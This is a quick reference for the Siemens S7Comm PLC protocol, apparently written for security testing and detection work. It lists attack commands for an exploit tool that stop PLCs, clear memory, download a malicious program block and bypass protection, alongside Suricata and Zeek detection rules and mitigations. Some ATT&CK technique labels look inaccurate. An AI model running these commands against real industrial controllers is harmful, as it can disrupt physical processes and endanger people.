# S7Comm Protocol Quick Reference

## Protocol Overview
- **Protocol**: S7Comm/S7CommPlus
- **Port**: TCP/102
- **OSI Layer**: Application Layer (over ISO-TSAP)
- **Vendor**: Siemens
- **Primary Use**: S7-300/400/1200/1500 PLC communication, TIA Portal

## Attack Tool Reference
**Implementation**: `tools/s7comm_security_framework/s7comm_exploit.py`
**Version**: 4.0
**Testing Guide**: `tools/s7comm_security_framework/TESTING.md`

## Protocol Identifiers
| Protocol ID | Name | Description |
|-------------|------|-------------|
| 0x32 | S7Comm | Classic S7 protocol (S7-300/400) |
| 0x72 | S7CommPlus | Enhanced protocol (S7-1200/1500) |

**Reference**: `s7comm_exploit.py:46-49`

## Function Codes
| Code | Function | MITRE | Tool Method |
|------|----------|-------|-------------|
| 0xF0 | Setup Communication | T0888 | Connection setup |
| 0x04 | Read Var | T0801, T0861 | `read_area()` |
| 0x05 | Write Var | T0855, T0836 | `write_area()` |
| 0x1A | Request Download | T0843, T0800 | `download_block()` |
| 0x1B | Download Block | T0843, T0873 | `download_block()` |
| 0x1C | Download Ended | T0843 | `download_block()` |
| 0x1D | Start Upload | T0802, T0868 | `upload_block()` |
| 0x1E | Upload | T0802, T0861 | `upload_block()` |
| 0x1F | End Upload | T0802 | `upload_block()` |
| 0x28 | PLC Control | T0858, T0871 | `plc_start()` |
| 0x29 | PLC Stop | T0809, T0858 | `plc_stop()` |

**Reference**: `s7comm_exploit.py:52-64`

## Memory Areas
| Area Code | Name | Description | Access |
|-----------|------|-------------|--------|
| 0x03 | System Info | SZL (System Status List) | Read-only |
| 0x05 | System Flags | System memory | Read/Write |
| 0x06 | Analog Inputs | AI values | Read-only |
| 0x07 | Analog Outputs | AO values | Read/Write |
| 0x1C | Counter | Counter values | Read/Write |
| 0x1D | Timer | Timer values | Read/Write |
| 0x80 | Direct Peripheral | I/O direct access | Read/Write |
| 0x81 | Inputs | Digital inputs | Read-only |
| 0x82 | Outputs | Digital outputs | Read/Write |
| 0x83 | Flags (Merkers) | Internal memory | Read/Write |
| 0x84 | Data Block (DB) | User data blocks | Read/Write |
| 0x85 | Instance DB (DI) | Instance data | Read/Write |
| 0x86 | Local | Local stack | Context-dependent |

**Reference**: `s7comm_exploit.py:67-82`

## Protection Levels
| Level | Name | Restrictions |
|-------|------|--------------|
| 0 | No Protection | Full access |
| 1 | Write Protection | Read allowed, write requires password |
| 2 | Read/Write Protection | Both require password |
| 3 | Full Protection | All operations blocked |

**Reference**: `s7comm_exploit.py:85-90`

## Packet Structure

### Complete S7Comm Packet
```
TPKT Header (4 bytes):
  Version: 1 byte (0x03)
  Reserved: 1 byte (0x00)
  Length: 2 bytes (total packet length)

COTP Header (3 bytes):
  Length: 1 byte (0x02)
  PDU Type: 1 byte (0xF0 = Data)
  TPDU Number: 1 byte (0x80)

S7Comm Header (10 bytes):
  Protocol ID: 1 byte (0x32 = S7Comm, 0x72 = S7CommPlus)
  Message Type: 1 byte (0x01 = Job, 0x03 = Ack_Data)
  Reserved: 2 bytes (0x0000)
  PDU Reference: 2 bytes (request ID)
  Parameter Length: 2 bytes
  Data Length: 2 bytes
  Error Class/Code: 2 bytes (in responses)

Parameters: variable
Data: variable
```
**Reference**: `s7comm_exploit.py:94-140`

### S7CommPlus Differences
- Protocol ID: 0x72
- Enhanced encryption support
- Optimized data structures
- Improved performance
- Additional security features

**Detection**: `s7comm_exploit.py:1050-1100`

## Attack Methods

### 1. Reconnaissance
```bash
# Device enumeration and fingerprinting
python3 s7comm_exploit.py --target 192.168.1.10 --scan

# Read system information (SZL)
python3 s7comm_exploit.py --target 192.168.1.10 --read-szl 0x0011

# Extract symbol table
python3 s7comm_exploit.py --target 192.168.1.10 extract-symbols --output symbols.json
```
**MITRE**: T0888 (Remote System Discovery), T0801 (Monitor Process State), T0861 (Point & Tag Identification)
**Tool Reference**: `s7comm_exploit.py:650-750`

### 2. Data Block Operations
```bash
# Read data block
python3 s7comm_exploit.py --target 192.168.1.10 --read-db 1 --size 100

# Write data block
python3 s7comm_exploit.py --target 192.168.1.10 --write-db 1 --offset 0 --data "4142434445"

# Export all data blocks
python3 s7comm_exploit.py --target 192.168.1.10 export-all-dbs --output ./db_export/
```
**MITRE**: T0801 (Monitor Process State), T0855 (Unauthorized Command Message), T0802 (Automated Collection)
**Tool Reference**: `s7comm_exploit.py:800-900`

### 3. PLC Control
```bash
# Stop PLC (FC 0x29)
python3 s7comm_exploit.py --target 192.168.1.10 --plc-stop

# Start PLC (FC 0x28)
python3 s7comm_exploit.py --target 192.168.1.10 --plc-start

# Memory clear (MRES)
python3 s7comm_exploit.py --target 192.168.1.10 --plc-mres
```
**MITRE**: T0858 (Change Operating Mode), T0809 (Data Destruction), T0871 (Execution through API)
**Tool Reference**: `s7comm_exploit.py:550-600`

### 4. Block Upload/Download
```bash
# Upload block from PLC (FC 0x1D, 0x1E, 0x1F)
python3 s7comm_exploit.py --target 192.168.1.10 --upload-block OB1 --output OB1.mc7

# Download block to PLC (FC 0x1A, 0x1B, 0x1C)
python3 s7comm_exploit.py --target 192.168.1.10 --download-block malicious_OB1.mc7
```
**MITRE**: T0802 (Automated Collection), T0843 (Program Download), T0873 (Project File Infection)
**Tool Reference**: `s7comm_exploit.py:900-1000`

### 5. Protection Bypass
```bash
# Test protection bypass techniques
python3 s7comm_exploit.py --target 192.168.1.10 test-protection

# Try multiple connection types
python3 s7comm_exploit.py --target 192.168.1.10 test-protection --connection-types PG,OP,S7Basic
```
**MITRE**: T0800 (Activate Firmware Update Mode), T0849 (Exploit Public-Facing Application)
**Tool Reference**: `s7comm_exploit.py:1000-1050`

### 6. S7CommPlus Detection
```bash
# Probe for S7CommPlus support
python3 s7comm_exploit.py --target 192.168.1.10 s7plus-probe
```
**MITRE**: T0888 (Remote System Discovery), T0868 (Detect Operating Mode)
**Tool Reference**: `s7comm_exploit.py:1050-1100`

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/ics_malware_detection.rules`

```
# S7Comm PLC Stop command (FC 0x29)
alert tcp any any -> any 102 (msg:"ICS: S7Comm PLC Stop Command Detected"; \
    content:"|03 00|"; offset:0; depth:2; content:"|32|"; offset:7; depth:1; \
    content:"|29|"; distance:3; within:10; \
    reference:url,attack.mitre.org/techniques/T0809; \
    classtype:industrial-protocol; sid:400002; rev:2;)

# S7CommPlus protocol detection (Protocol ID 0x72)
alert tcp any any -> any 102 (msg:"ICS: S7CommPlus Protocol Detected"; \
    content:"|03 00|"; offset:0; depth:2; content:"|72|"; offset:7; depth:1; \
    classtype:industrial-protocol; sid:400008; rev:1;)

# Symbol table extraction (SZL reads)
alert tcp any any -> any 102 (msg:"ICS: S7Comm Symbol Table Extraction Attempt"; \
    content:"|03 00|"; offset:0; depth:2; content:"|32 04|"; offset:7; depth:2; \
    threshold: type threshold, track by_src, count 5, seconds 120; \
    classtype:industrial-protocol; sid:400009; rev:1;)

# Data block mass export detection
alert tcp any any -> any 102 (msg:"ICS: S7Comm Data Block Mass Export"; \
    content:"|03 00|"; offset:0; depth:2; content:"|32 04|"; offset:7; depth:2; \
    content:"|84|"; distance:0; within:20; \
    threshold: type threshold, track by_src, count 10, seconds 60; \
    classtype:industrial-protocol; sid:400010; rev:1;)

# Protection bypass attempts
alert tcp any any -> any 102 (msg:"ICS: S7Comm Protection Bypass Attempt"; \
    content:"|03 00|"; offset:0; depth:2; content:"|32|"; offset:7; depth:1; \
    threshold: type threshold, track by_src, count 3, seconds 10; \
    classtype:industrial-protocol; sid:400011; rev:1;)
```

### Zeek Detection
**File**: `configs/zeek/ics_detection.zeek`

```zeek
# S7Comm PLC control monitoring
event s7_control_message(c: connection, func: count) {
    local operation = "";
    local severity = "HIGH";
    
    if (func == 0x28) {
        operation = "PLC_START";
        severity = "HIGH";
    } else if (func == 0x29) {
        operation = "PLC_STOP";
        severity = "CRITICAL";
    }
    
    Log::write(ICS::LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $protocol="S7Comm", $operation=operation,
        $severity=severity, $details=fmt("Function: 0x%02x", func)]);
}

# Data block mass export detection
global s7_db_reads: table[addr] of count &create_expire=60sec;

event s7_read_request(c: connection, area: count, db_number: count) {
    if (area == 0x84) {  # Data Block area
        if (c$id$orig_h !in s7_db_reads) {
            s7_db_reads[c$id$orig_h] = 0;
        }
        s7_db_reads[c$id$orig_h] += 1;
        
        if (s7_db_reads[c$id$orig_h] >= 10) {
            Log::write(ICS::LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
                $protocol="S7Comm", $operation="DB_MASS_EXPORT",
                $severity="CRITICAL", $details=fmt("DB reads: %d in 60s", s7_db_reads[c$id$orig_h])]);
        }
    }
}

# S7CommPlus detection
event s7_header(c: connection, protocol_id: count) {
    if (protocol_id == 0x72) {
        Log::write(ICS::LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $protocol="S7CommPlus", $operation="PROTOCOL_DETECTED",
            $severity="MEDIUM", $details="S7-1200/1500 communication"]);
    }
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: SZL reads, device enumeration
- **T0801**: Monitor Process State
  - Methods: Read DB, read I/O areas
- **T0868**: Detect Operating Mode
  - Methods: CPU status queries
- **T0861**: Point & Tag Identification
  - Methods: Symbol table extraction

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: PLC Start (0x28), Write operations
- **T0858**: Change Operating Mode
  - Methods: PLC Stop (0x29), PLC Start (0x28)

### Persistence (Tactic: TA0110)
- **T0843**: Program Download
  - Methods: Block download (0x1A, 0x1B, 0x1C)
- **T0873**: Project File Infection
  - Methods: Modified block upload/download

### Defense Evasion (Tactic: TA0103)
- **T0849**: Exploit Public-Facing Application
  - Methods: Protection bypass techniques
- **T0800**: Activate Firmware Update Mode
  - Methods: Bootloader access attempts

### Impact (Tactic: TA0105)
- **T0809**: Data Destruction
  - Methods: PLC Stop (0x29), Memory clear
- **T0855**: Unauthorized Command Message
  - Methods: Write operations (0x05)
- **T0836**: Modify Parameter
  - Methods: DB writes, output manipulation

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: Block upload (0x1D-0x1F), DB mass export

## Common Vulnerabilities

### Weak Authentication
- **Issue**: Password-based protection easily bypassed
- **Impact**: Unauthorized access to protected PLCs
- **Mitigation**: Network segmentation, know-good baselines

### Cleartext Communication
- **Issue**: No encryption in S7Comm (0x32)
- **Impact**: Traffic analysis, replay attacks
- **Mitigation**: Use S7CommPlus (0x72) with TLS, VPN tunnels

### Block Replacement
- **Issue**: No code signing on program blocks
- **Impact**: Malicious logic injection
- **Mitigation**: Offline block verification, checksums

### Protection Level Bypass
- **Issue**: Multiple connection types (PG, OP, Basic)
- **Impact**: Read/write access via alternative paths
- **Mitigation**: Restrict connection types, firewall rules

## Defense Recommendations

### Network Layer
1. **Segmentation**: Isolate S7 networks from engineering stations
2. **Firewall Rules**: Restrict TCP/102 to authorized hosts only
3. **IDS/IPS**: Deploy Suricata rules for S7Comm monitoring
4. **Protocol Validation**: Zeek scripts for anomaly detection

### PLC Configuration
1. **Protection Levels**: Enable maximum protection (Level 3)
2. **Password Complexity**: Use strong PLC passwords (8+ chars)
3. **Connection Restrictions**: Disable unused connection types
4. **Block Checksums**: Maintain hash database of all blocks

### Operational
1. **Change Control**: Document all PLC programming changes
2. **Block Backup**: Regular offline backups of all blocks
3. **Audit Logging**: Log all S7Comm connections and operations
4. **Baseline Monitoring**: Alert on deviations from normal traffic

## Protocol Limits
- **Max PDU Size**: 240 bytes (default), up to 960 bytes (negotiated)
- **Max Data Items per Request**: 20 items
- **Max Read Size**: Negotiated during Setup Communication
- **Max Write Size**: Negotiated during Setup Communication
- **Block Size Limit**: 64KB per block

**Reference**: `s7comm_exploit.py` header documentation

## Testing Checklist

### Reconnaissance Testing
- [ ] Device discovery and enumeration
- [ ] SZL information extraction
- [ ] Symbol table retrieval
- [ ] Protection level detection
- [ ] S7CommPlus probe

### Data Access Testing
- [ ] Data block read operations
- [ ] Data block write operations
- [ ] I/O area manipulation
- [ ] Memory area enumeration
- [ ] Mass DB export

### Control Testing
- [ ] PLC stop command
- [ ] PLC start command
- [ ] Memory clear (MRES)
- [ ] Operating mode changes
- [ ] CPU restart

### Advanced Testing
- [ ] Block upload from PLC
- [ ] Block download to PLC
- [ ] Protection bypass techniques
- [ ] Multiple connection type testing
- [ ] Protocol fuzzing

### Detection Validation
- [ ] Suricata rule triggering
- [ ] Zeek log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- Siemens S7Comm Protocol Documentation
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/s7comm_security_framework/s7comm_exploit.py`
- Detection Rules: `configs/suricata_rules/ics_malware_detection.rules`
- Zeek Monitor: `configs/zeek/ics_detection.zeek`
- Testing Guide: `tools/s7comm_security_framework/TESTING.md`
